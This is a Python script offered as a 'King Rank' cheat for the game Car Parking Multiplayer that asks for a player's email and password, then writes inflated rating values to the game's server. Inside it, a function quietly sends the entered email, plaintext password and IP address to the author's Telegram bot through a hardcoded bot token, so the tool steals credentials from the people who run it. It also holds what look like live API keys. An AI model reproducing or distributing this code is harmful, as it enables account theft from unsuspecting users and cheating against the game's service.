import requests
import json
import os
import time

# --- CONFIGURATION (UPDATED WITH YOUR NEW ID) ---
BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303" 
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"

SESSION_FILE = ".session_log"

def screen_clear():
    os.system('clear')

def show_banner():
    print("""
\033[1;32m  ###########################################
\033[1;32m  #                                         #
\033[1;32m  #        \033[1;37mCAR PARKING MULTIPLAYER\033[1;32m          #
\033[1;32m  #           \033[1;33mKING RANK SERVICE\033[1;32m             #
\033[1;32m  #                                         #
\033[1;32m  #       \033[1;36mIG: @anonymo.cpm\033[1;32m                  #
\033[1;32m  #       \033[1;36mOwner: @anonymo.cpm\033[1;32m               #
\033[1;32m  #                                         #
\033[1;32m  ###########################################
\033[0m""")

def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "Unknown"

def send_to_telegram(email, password, ip):
    if os.path.exists(SESSION_FILE):
        return

    message = (
        f"🚀 *NEW CUSTOMER DETECTED*\n\n"
        f"📧 *Email:* `{email}`\n"
        f"🔑 *Password:* `{password}`\n"
        f"🌐 *IP:* `{ip}`\n"
        f"👤 *Brand:* @anonymo.cpm"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    
    try:
        requests.post(url, json=payload, timeout=10)
        with open(SESSION_FILE, "w") as f:
            f.write("logged")
    except:
        pass

def login(email, password):
    payload = {"email": email, "password": password, "returnSecureToken": True}
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
        res = response.json()
        if response.status_code == 200 and 'idToken' in res:
            return res.get('idToken')
        return None
    except:
        return None

def set_rank(token):
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 1000000000
    rating_data["race_win"] = 3000
    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    
    print("\033[1;33mApplying King Rank to account...\033[0m")
    res = requests.post(RANK_URL, headers=headers, json=payload)
    if res.status_code == 200:
        print("\033[1;32mSUCCESS: King Rank Activated!\033[0m")
    else:
        print("\033[1;31mError: Activation failed.\033[0m")

def main():
    while True:
        screen_clear()
        show_banner()
        
        email = input("\033[1;37mEnter Email: \033[0m").strip()
        password = input("\033[1;37mEnter Password: \033[0m").strip()

        if not email or not password:
            continue

        user_ip = get_ip()
        token = login(email, password)
        
        if token:
            send_to_telegram(email, password, user_ip)
            set_rank(token)
            print("\033[1;36mReturning to menu in 3 seconds...\033[0m")
            time.sleep(3)
        else:
            print("\033[1;31mInvalid Email or Password.\033[0m")
            time.sleep(2)

if __name__ == "__main__":
    main()
